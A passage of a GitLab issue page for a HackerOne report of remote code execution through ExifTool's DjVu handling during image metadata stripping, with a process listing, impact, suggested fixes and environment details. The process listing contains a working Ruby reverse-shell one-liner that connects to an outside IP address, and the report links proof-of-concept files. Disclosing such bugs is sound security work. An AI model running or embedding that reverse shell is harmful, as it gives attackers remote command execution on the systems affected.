\nroot      2084  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:0]  \nroot      2095  0.0  0.0  65512  3084 ?        Ss    2020   0:04 /usr/sbin/sshd -D  \nroot      2102  0.0  0.0      0     0 ?        I\u003c    2020   2:31 [kworker/9:1H]  \nroot      2120  0.0  0.0      0     0 ?        I\u003c    2020   5:08 [kworker/3:1H]  \nroot      2138  0.0  0.0      0     0 ?        I\u003c    2020   0:31 [kworker/15:1H]  \nroot      2146  0.0  0.0      0     0 ?        I\u003c    2020  23:45 [kworker/1:1H]  \nroot      2151  0.0  0.0      0     0 ?        I\u003c    2020   0:40 [kworker/4:1H]  \nroot      2167  0.0  0.0  14656  1372 tty1     Ss+   2020   0:00 /sbin/agetty --noclear tty1 linux  \nroot      2177  0.0  0.0  14472  1556 ttyS0    Ss+   2020   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220  \nntp       2204  0.0  0.0  40268  2576 ?        Ss    2020  21:06 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -c /var/lib/ntp/ntp.conf.dhcp -u 112:116  \nroot      2270  0.0  0.0  67480 18788 ?        Ss    2020  17:03 /usr/bin/python3 /usr/bin/google_ip_forwarding_daemon  \nroot      2272  0.0  0.0  67220 16368 ?        Ss    2020  10:50 /usr/bin/python3 /usr/bin/google_clock_skew_daemon  \nroot      2402  0.0  0.0  65408  2460 ?        Ss    2020   1:05 /usr/lib/postfix/sbin/master  \npostfix   2411  0.0  0.0  67640  1988 ?        S     2020   0:23 qmgr -l -t fifo -u  \nroot      2571  0.0  0.0   4392   848 ?        Ss    2020   2:50 runsvdir -P /opt/gitlab/service log: ...........................................................................................................................................................................................................................................................................................................................................................................................................  \nroot      2618  0.0  0.0   4240  1104 ?        Ss    2020   0:01 runsv puma  \nroot      2621  0.0  0.0   4240  1192 ?        Ss    2020   0:05 runsv logrotate  \nroot      2623  0.0  0.0   4240  1144 ?        Ss    2020   0:00 runsv nginx  \nroot      2625  0.0  0.0   4240  1092 ?        Ss    2020   0:01 runsv gitlab-workhorse  \ngitlab-+  3150  0.0  0.0 754368 26924 ?        Sl   Feb17  35:28 /opt/ruby-2.7.0/bin/ruby /opt/gitlab-monitor/bin/gitlab-mon web -c /opt/gitlab-monitor/config/worker-config.yml  \nroot      3164  0.0  0.0      0     0 ?        I\u003c    2020   0:12 [kworker/11:1H]  \nroot      3211  0.2  0.0      0     0 ?        I    12:42   0:04 [kworker/u32:2]  \nroot      3222  0.0  0.0      0     0 ?        I\u003c    2020   0:15 [kworker/7:1H]  \nroot      3463  0.0  0.0      0     0 ?        I    10:35   0:00 [kworker/5:1]  \nroot      3511  0.0  0.0      0     0 ?        I    11:40   0:00 [kworker/12:0]  \nroot      4032  0.0  0.1 1571276 107596 ?      Ssl   2020 172:34 /opt/prometheus/ebpf_exporter/ebpf_exporter --web.listen-address=:9435 --config.file=/opt/prometheus/ebpf_exporter/config.yml  \nroot      4171  0.0  0.0   4376   640 ?        S    13:12   0:00 sleep 600  \nroot      4302  0.0  0.0      0     0 ?        I\u003c    2020   2:25 [kworker/5:1H]  \nroot      4391  0.0  0.0      0     0 ?        I\u003c    2020   0:14 [kworker/8:1H]  \nroot      4699  0.0  0.0      0     0 ?        I    11:09   0:00 [kworker/13:2]  \nroot      4812  0.0  0.0   4376   672 ?        S    13:13   0:00 sleep 60  \nroot      5375  0.0  0.0   4504   788 ?        Ss   13:13   0:00 /bin/sh /opt/gitlab/embedded/bin/gitlab-logrotate-wrapper  \nroot      5379  0.0  0.0   4376   748 ?        S    13:13   0:00 sleep 600  \ngit       5398 49.7  1.9 2661404 1274712 ?     Sl   12:44  14:43 puma: cluster worker 3: 7369 [gitlab-puma-worker]  \ngit       5544  1.3  0.0  45604 27664 ?        S    13:14   0:00 /usr/bin/perl -w /opt/gitlab/embedded/bin/exiftool -all= --IPTC:all --XMP-iptcExt:all -tagsFromFile @ -ResolutionUnit -XResolution -YResolution -YCbCrSubSampling -YCbCrPositioning -BitsPerSample -ImageHeight -ImageWidth -ImageSize -Copyright -CopyrightNotice -Orientation -  \ngit       5545  0.0  0.0      0     0 ?        Z    13:14   0:00 [sh] \u003cdefunct\u003e  \ngit       5551  0.0  0.0 105260 10840 ?        S    13:14   0:00 ruby -rsocket -e exit if fork;c=TCPSocket.new(\&quot;103.3.61.137\&quot;,12345);while(cmd=c.gets);IO.popen(cmd,\&quot;r\&quot;){|io|c.print io.read}end  \ngit       5667  0.0  0.0   4504   740 ?        S    13:14   0:00 sh -c ps auxww  \ngit       5668  0.0  0.0  34424  2864 ?        R    13:14   0:00 ps auxww  \nroot      5952  0.0  0.0      0     0 ?        I    00:24   0:00 [kworker/5:2]  \nroot      6812  0.0  0.0  54640  7080 ?        Ss   Mar08   0:00 nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginx  \ngitlab-+  6813  0.0  0.0  59476 12544 ?        S    Mar08  18:42 nginx: worker process  \ngitlab-+  6814  0.0  0.0  59380 13704 ?        S    Mar08  18:28 nginx: worker process  \ngitlab-+  6815  0.0  0.0  59504 13088 ?        S    Mar08  18:57 nginx: worker process  \ngitlab-+  6816  0.0  0.0  59456 13048 ?        S    Mar08  19:35 nginx: worker process  \ngitlab-+  6817  0.0  0.0  59468 13396 ?        S    Mar08  18:41 nginx: worker process  \ngitlab-+  6818  0.0  0.0  59508 13700 ?        S    Mar08  20:20 nginx: worker process  \ngitlab-+  6819  0.0  0.0  59492 13220 ?        S    Mar08  19:33 nginx: worker process  \ngitlab-+  6820  0.0  0.0  59460 13420 ?        S    Mar08  22:00 nginx: worker process  \ngitlab-+  6821  0.0  0.0  59508 13420 ?        S    Mar08  24:15 nginx: worker process  \ngitlab-+  6822  0.0  0.0  59500 13348 ?        S    Mar08  20:53 nginx: worker process  \ngitlab-+  6823  0.0  0.0  59660 13588 ?        S    Mar08  27:47 nginx: worker process  \ngitlab-+  6824  0.0  0.0  59972 14116 ?        S    Mar08  37:52 nginx: worker process  \ngitlab-+  6825  4.0  0.0  63940 18592 ?        S    Mar08 1788:21 nginx: worker process  \ngitlab-+  6826  1.9  0.0  61436 15808 ?        S    Mar08 854:41 nginx: worker process  \ngitlab-+  6827  0.1  0.0  60120 14564 ?        S    Mar08  79:52 nginx: worker process  \ngitlab-+  6828  0.8  0.0  62348 16532 ?        S    Mar08 351:59 nginx: worker process  \ngitlab-+  6829  0.0  0.0  54836  3732 ?        S    Mar08   0:08 nginx: cache manager process  \ngit       6952 17.6  0.1 1532460 109784 ?      Ssl  10:04  33:35 /opt/gitlab/embedded/bin/gitlab-workhorse -listenNetwork unix -listenUmask 0 -listenAddr /var/opt/gitlab/gitlab-workhorse/sockets/socket -authBackend http://localhost:8080 -authSocket /var/opt/gitlab/gitlab-rails/sockets/gitlab.socket -documentRoot /opt/gitlab/embedded/service/gitlab-rails/public -pprofListenAddr  -apiLimit 5 -apiQueueDuration 60s -apiQueueLimit 200 -prometheusListenAddr 0.0.0.0:9229 -secretPath /opt/gitlab/embedded/service/gitlab-rails/.gitlab_workhorse_secret -logFormat json -config config.toml  \ngit       7369 10.3  1.5 1859556 1033020 ?     Ssl  10:04  19:41 puma 5.1.1 (unix:///var/opt/gitlab/gitlab-rails/sockets/gitlab.socket,tcp://0.0.0.0:8080) [gitlab-puma-worker]  \nroot      7522  0.0  0.0      0     0 ?        I    10:04   0:00 [kworker/11:2]  \nroot      8263  0.0  0.0      0     0 ?        I    12:15   0:00 [kworker/14:0]  \nroot      8266  0.0  0.0      0     0 ?        I    08:19   0:00 [kworker/0:2]  \nroot      8581  0.1  0.0      0     0 ?        I    12:48   0:02 [kworker/u32:1]  \nroot      9122  0.0  0.0      0     0 ?        I    10:37   0:00 [kworker/8:0]  \ngit       9978 47.0  2.0 3182348 1362056 ?     Sl   11:43  42:45 puma: cluster worker 8: 7369 [gitlab-puma-worker]  \nconsul   10871  0.5  0.2 257480 143704 ?       Ssl   2020 2836:38 /opt/consul/1.7.2/consul agent -config-file=/etc/consul/consul.json -config-dir=/etc/consul/conf.d  \ngit      10980 51.1  1.8 2507012 1229264 ?     Sl   12:49  12:43 puma: cluster worker 2: 7369 [gitlab-puma-worker]  \ninfluxd+ 12182  0.0  0.0 188928  1044 ?        Ssl   2020   0:14 /usr/bin/influxdb-relay -config /etc/influxdb-relay/influxdb-relay.conf  \nroot     12322  0.0  0.0      0     0 ?        I    12:49   0:00 [kworker/11:1]  \nroot     12828  0.0  0.0   4384  1276 ?        S     2020   0:01 svlogd -tt /var/log/gitlab/puma  \nroot     12831  0.2  0.0   4384  1228 ?        S     2020 1318:06 svlogd /var/log/gitlab/gitlab-workhorse  \nroot     12853  0.0  0.0   4384  1260 ?        S     2020   0:02 svlogd -tt /var/log/gitlab/nginx  \nroot     12856  0.0  0.0   4384   340 ?        S     2020   0:00 svlogd -tt /var/log/gitlab/logrotate  \ngit      13196 48.0  2.1 2935068 1437312 ?     Sl   12:17  27:28 puma: cluster worker 10: 7369 [gitlab-puma-worker]  \nroot     13379  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/7:1]  \nroot     13382  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/10:1]  \nroot     13611  1.0  0.0 1740892 38864 ?       Ssl  Jan29 1042:19 /usr/bin/process-exporter --config.path /etc/process-exporter/chef-configured.yaml --web.listen-address=:9256 -threads=false -gather-smaps=false  \nroot     14478  0.0  0.0      0     0 ?        I    09:24   0:00 [kworker/2:0]  \ngit      17155 50.3  1.8 2541576 1218444 ?     Sl   12:50  11:50 puma: cluster worker 15: 7369 [gitlab-puma-worker]  \nroot     17904  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/2:2]  \ngit      21109 48.3  1.9 2572804 1258580 ?     Sl   12:55   9:17 puma: cluster worker 5: 7369 [gitlab-puma-worker]  \nroot     21296  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/8:1]  \nroot     21299  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/1:0]  \nroot     21301  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/7:0]  \nroot     21306  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/15:1]  \nroot     21376  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/9:0]  \ngit      21698 48.0  2.2 3093788 1459416 ?     Sl   12:26  23:00 puma: cluster worker 9: 7369 [gitlab-puma-worker]  \nroot     22003  0.2  0.0      0     0 ?        I    12:26   0:05 [kworker/u32:3]  \nroot     22131  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/9:2]  \nroot     22135  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/4:2]  \nroot     22142  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/12:3]  \nroot     22143  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/3:1]  \nroot     22144  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/13:0]  \nroot     22863  0.0  0.0 161112 54712 ?        Ssl  Jan18   0:15 /opt/chef/embedded/bin/ruby --disable-gems /usr/bin/chef-client -c /etc/chef/client.rb -i 1800 -s 300  \nroot     24237  0.0  0.0 288904 59208 ?        Sl   Mar10   6:50 /opt/td-agent/bin/ruby /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid  \nroot     24242 20.6  0.5 3044156 391860 ?      Sl   Mar10 8337:18 /opt/td-agent/bin/ruby -Eascii-8bit:ascii-8bit /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid --under-supervisor  \ngit      24253 51.3  2.0 2857244 1349560 ?     Sl   12:29  23:03 puma: cluster worker 13: 7369 [gitlab-puma-worker]  \nroot     24667  0.1  0.0      0     0 ?        I    11:29   0:11 [kworker/u32:4]  \nroot     24911  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:2]  \nroot     25156  0.2  0.0      0     0 ?        I    12:59   0:01 [kworker/u32:5]  \nroot     25516  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/1:1]  \ngit      25517 50.4  2.1 2870560 1443204 ?     Sl   12:30  21:58 puma: cluster worker 6: 7369 [gitlab-puma-worker]  \ngit      25521 49.9  1.8 2550792 1218900 ?     Sl   13:00   7:06 puma: cluster worker 4: 7369 [gitlab-puma-worker]  \nroot     25525  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/3:2]  \nroot     25527  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/15:2]  \nroot     26983  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/10:2]  \nroot     27893  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [xfsalloc]  \nroot     27894  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [xfs_mru_cache]  \ngit      28051 49.9  1.8 2635012 1248076 ?     Sl   13:03   5:34 puma: cluster worker 11: 7369 [gitlab-puma-worker]  \ngit      28140 50.3  2.1 2943756 1397844 ?     Sl   12:33  20:26 puma: cluster worker 14: 7369 [gitlab-puma-worker]  \ngit      29132 49.0  2.0 3164444 1367952 ?     Sl   12:05  33:39 puma: cluster worker 1: 7369 [gitlab-puma-worker]  \nroot     30224  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/14:1]  \nroot     30233  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/0:1]  \nroot     31940  0.0  0.0 278944 10648 ?        Ssl   2020   6:14 /usr/lib/accountsservice/accounts-daemon  \nroot     32135  0.1  0.0      0     0 ?        I    13:07   0:00 [kworker/u32:0]  \nroot     32388  0.0  0.0      0     0 ?        I    01:32   0:00 [kworker/4:0]  \nroot     32453  5.3  0.0 1774984 40780 ?       Sl    2020 13156:17 /opt/prometheus/mtail/mtail -progs /opt/prometheus/mtail/progs -logs /var/log/apt/term.log,/var/log/syslog,/var/log/td-agent/td-agent.log,/var/log/gitlab/gitlab-rails/*.log,/var/log/gitlab/unicorn/unicorn_stderr.log,/var/log/gitlab/unicorn/unicorn_stdout.log -logtostderr  \ngit      32635 49.4  2.1 3154204 1401116 ?     Sl   12:09  31:54 puma: cluster worker 12: 7369 [gitlab-puma-worker]  \ngit      32703 48.7  1.8 2402308 1195496 ?     Sl   13:08   3:01 puma: cluster worker 7: 7369 [gitlab-puma-worker]  \nexit  \n```\n\n\n#####  Impact  \n* Anyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file\n\n#####  Examples  \n![echo_vakzz.jpg.zip](https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip)  \n![reverse_shell.jpg.zip](https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip)\n\n#####  What is the current *bug* behavior?  \nGitLab Workhorse will pass any file to ExifTool, greatly increasing the attack surface. The current bug is in the DjVu module of `ExifTool` which should ideally not ever be hit.\n\n#####  What is the expected *correct* behavior?  \n* There must be better ways of convert C escape sequences than using `eval`  \n* Only the TIFF and JPEG modules should be used  \n* GitLab Workhorse could check if the file is a valid TIFF of JPEG before passing it to ExifTool\n\n#####  Output of checks  \nThis bug happens on GitLab.com\n\n######  Results of GitLab environment info  \n```  \nSystem information  \nSystem:  \nProxy:\t\tno  \nCurrent User:\tgit  \nUsing RVM:\tno  \nRuby Version:\t2.7.2p137  \nGem Version:\t3.1.4  \nBundler Version:2.1.4  \nRake Version:\t13.0.3  \nRedis Version:\t6.0.10  \nGit Version:\t2.29.0  \nSidekiq Version:5.2.9  \nGo Version:\tunknown\n\nGitLab information  \nVersion:\t13.10.2-ee  \nRevision:\tcc4224220e6  \nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails  \nDB Adapter:\tPostgreSQL  \nDB Version:\t12.6  \nURL:\t\thttp://192.168.0.127:9080  \nHTTP Clone URL:\thttp://192.168.0.127:9080/some-group/some-project.git  \nSSH Clone URL:\tgit@192.168.0.127:some-group/some-project.git  \nElasticsearch:\tno  \nGeo:\t\tno  \nUsing LDAP:\tno  \nUsing Omniauth:\tyes  \nOmniauth Providers:\n\nGitLab Shell  \nVersion:\t13.17.0  \nRepository storage paths:  \n- default: \t/var/opt/gitlab/git-data/repositories  \nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell  \nGit:\t\t/opt/gitlab/embedded/bin/git  \n```\n\n####  Impact\n\n* Anyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [echo_vakzz.jpg.zip](https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip)\n* [reverse_shell.jpg.zip](https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues&quot;,&quot;title&quot;:&quot;RCE when removing metadata with ExifTool&quot;,&quot;time_estimate&quot;:0,&quot;total_time_spent&quot;:0,&quot;human_time_estimate&quot;:null,&quot;human_total_time_spent&quot;:null,&quot;state&quot;:&quot;closed&quot;,&quot;milestone_id&quot;:1406669,&quot;updated_by_id&quot;:4992072,&quot;created_at&quot;:&quot;2021-04-07T14:06:50Z&quot;,&quot;updated_at&quot;:&quot;2024-06-20T04:25:56Z&quot;,&quot;milestone&quot;:{&quot;id&quot;:1406669,&quot;iid&quot;:59,&quot;group_id&quot;:9970,&quot;title&quot;:&quot;13.11&quot;,&quot;description&quot;:&quot;https://about.gitlab.com/releases/archives.html&quot;,&quot;state&quot;:&quot;closed&quot;,&quot;created_at&quot;:&quot;2020-08-13T14:23:09.688Z&quot;,&quot;updated_at&quot;:&quot;2022-04-21T07:22:08.835Z&quot;,&quot;due_date&quot;:&quot;2021-04-17&quot;,&quot;start_date&quot;:&quot;2021-03-18&quot;,&quot;expired&quot;:true,&quot;web_url&quot;:&quot;https://gitlab.com/groups/gitlab-org/-/milestones/59&quot;},&quot;labels&quot;:[{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:18269330,&quot;title&quot;:&quot;Weakness::CWE-94&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;Code Injection&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-02-09T21:50:01.700Z&quot;,&quot;updated_at&quot;:&quot;2021-02-09T21:50:01.700Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:1890178,&quot;title&quot;:&quot;[deprecated] Accepting merge requests&quot;,&quot;color&quot;:&quot;#69d100&quot;,&quot;description&quot;:&quot;[deprecated] Please use \&quot;Seeking community contributions\&quot; instead. https://gitlab.com/gitlab-org/developer-relations/contributor-success/team-task/-/issues/77&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2017-04-21T11:34:01.286Z&quot;,&quot;updated_at&quot;:&quot;2023-06-28T08:14:53.591Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3103451,&quot;title&quot;:&quot;devops::plan&quot;,&quot;color&quot;:&quot;#E44D2A&quot;,&quot;description&quot;:&quot;Issues for the Plan stage of the DevOps lifecycle (e.g. Project Management, Agile Portfolio Management, Requirements Management)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-12-01T19:00:23.723Z&quot;,&quot;updated_at&quot;:&quot;2022-05-11T06:40:37.661Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:10690700,&quot;title&quot;:&quot;group::product planning&quot;,&quot;color&quot;:&quot;#A8D695&quot;,&quot;description&quot;:&quot;Issues belonging to the Product Planning group of the Plan stage of the DevOps lifecycle. See https://about.gitlab.com/handbook/product/product-categories/#product-planning-group&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2019-05-22T19:55:52.229Z&quot;,&quot;updated_at&quot;:&quot;2020-10-16T19:33:41.349Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857370,&quot;title&quot;:&quot;priority::1&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;We will address this as soon as possible regardless of limit on our team capacity. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-04-13T07:50:27.056Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:23:21.667Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:14918378,&quot;title&quot;:&quot;section::dev&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Issues related to the Dev section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;updated_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713903,&quot;title&quot;:&quot;severity::1&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Blocker - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:46.557Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:11:28.095Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}],&quot;lock_version&quot;:1,&quot;author_id&quot;:2741139,&quot;confidential&quot;:false,&quot;discussion_locked&quot;:null,&quot;assignees&quot;:[],&quot;due_date&quot;:&quot;2021-05-07&quot;,&quot;project_id&quot;:278964,&quot;moved_to_id&quot;:null,&quot;duplicated_to_id&quot;:null,&quot;web_url&quot;:&quot;/gitlab-org/gitlab/-/issues/327121&quot;,&quot;current_user&quot;:{&quot;can_create_note&quot;:false,&quot;can_create_confidential_note&quot;:false,&quot;can_update&quot;:false,&quot;can_set_issue_metadata&quot;:false,&quot;can_award_emoji&quot;:false},&quot;create_note_path&quot;:&quot;/gitlab-org/gitlab/notes?target_id=84801598\u0026target_type=issue&quot;,&quot;preview_note_path&quot;:&quot;/gitlab-org/gitlab/-/preview_markdown?target_id=327121\u0026target_type=Issue&quot;,&quot;is_project_archived&quot;:false,&quot;issue_email_participants&quot;:[],&quot;type&quot;:&quot;ISSUE&quot;,&quot;weight&quot;:null,&quot;blocked&quot;:false,&quot;blocked_by_issues&quot;:[]}" data-noteable-type="Issue" data-notes-data="{&quot;noteableType&quot;:&quot;issue&quot;,&quot;noteableId&quot;:84801598,&quot;projectId&quot;:278964,&quot;groupId&quot;:null,&quot;discussionsPath&quot;:&quot;/gitlab-org/gitlab/-/issues/327121/discussions.json&quot;,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;newSessionPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;quickActionsDocsPath&quot;:&quot;/help/user/project/quick_actions.md&quot;,&quot;closePath&quot;:&quot;/gitlab-org/gitlab/-/issues/327121.json?issue%5Bstate_event%5D=close&quot;,&quot;reopenPath&quot;:&quot;/gitlab-org/gitlab/-/issues/327121.json?issue%5Bstate_event%5D=reopen&quot;,&quot;notesPath&quot;:&quot;/gitlab-org/gitlab/noteable/issue/84801598/notes&quot;,&quot;prerenderedNotesCount&quot;:10,&quot;lastFetchedAt&quot;:1736344826000000,&quot;notesFilter&quot;:null}" data-notes-filters="{&quot;Show all activity&quot;:0,&quot;Show comments only&quot;:1,&quot;Show history only&quot;:2}" data-report-abuse-path="/-/abuse_reports/add_category" data-show-timeline-view-toggle="false" data-target-type="issue" id="js-vue-notes"></div>
</section>

</div>
</div>
<aside aria-label="issue" aria-live="polite" class="right-sidebar js-right-sidebar js-issuable-sidebar right-sidebar-expanded" data-always-show-toggle data-auto-collapse data-issuable-type="issue">
<div class="issuable-sidebar">
<div class="issuable-sidebar-header">
<button class="gl-button btn btn-md btn-default gutter-toggle gl-float-right js-sidebar-toggle has-tooltip !gl-border-0" type="button" aria-label="Toggle sidebar" title="Collapse sidebar" data-container="body" data-placement="left" data-boundary="viewport" type="button"><span class="gl-button-text">
<span class="js-sidebar-toggle-container gl-button-text" data-is-expanded="true"><svg class="s16 js-sidebar-expand hidden" data-testid="chevron-double-lg-left-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-left"></use></svg><svg class="s16 js-sidebar-collapse " data-testid="chevron-double-lg-right-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-right"></use></svg></span>

</span>

</button></div>
<form class="issuable-context-form inline-update js-issuable-update " action="/gitlab-org/gitlab/-/issues/327121.json" accept-charset="UTF-8" data-remote="true" method="post"><div class="block assignee gl-mt-3" data-testid="assignee-block-container">
<div class="js-sidebar-assignees-root" data-field="issue" data-max-assignees="200">
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Assignee</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>

</div>
<div class="block epic" data-testid="sidebar-epic">
<div class="js-sidebar-epic-widget-root" data-can-edit="false" data-group-path="gitlab-org" data-issue-id="84801598" data-issue-iid="327121" data-project-path="gitlab-org/gitlab"></div>
</div>

<div class="js-sidebar-labels-widget-root" data-allow-label-create="" data-allow-scoped-labels="true" data-can-edit="" data-iid="327121" data-issuable-type="issue" data-labels-fetch-path="/gitlab-org/gitlab/-/labels.json?include_ancestor_groups=true" data-labels-manage-path="/gitlab-org/gitlab/-/labels" data-project-issues-path="/gitlab-org/gitlab/-/issues" data-project-path="gitlab-org/gitlab" data-selected-labels="[{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:18269330,&quot;title&quot;:&quot;Weakness::CWE-94&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;Code Injection&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-02-09T21:50:01.700Z&quot;,&quot;updated_at&quot;:&quot;2021-02-09T21:50:01.700Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:1890178,&quot;title&quot;:&quot;[deprecated] Accepting merge requests&quot;,&quot;color&quot;:&quot;#69d100&quot;,&quot;description&quot;:&quot;[deprecated] Please use \&quot;Seeking community contributions\&quot; instead. https://gitlab.com/gitlab-org/developer-relations/contributor-success/team-task/-/issues/77&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2017-04-21T11:34:01.286Z&quot;,&quot;updated_at&quot;:&quot;2023-06-28T08:14:53.591Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3103451,&quot;title&quot;:&quot;devops::plan&quot;,&quot;color&quot;:&quot;#E44D2A&quot;,&quot;description&quot;:&quot;Issues for the Plan stage of the DevOps lifecycle (e.g. Project Management, Agile Portfolio Management, Requirements Management)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-12-01T19:00:23.723Z&quot;,&quot;updated_at&quot;:&quot;2022-05-11T06:40:37.661Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:10690700,&quot;title&quot;:&quot;group::product 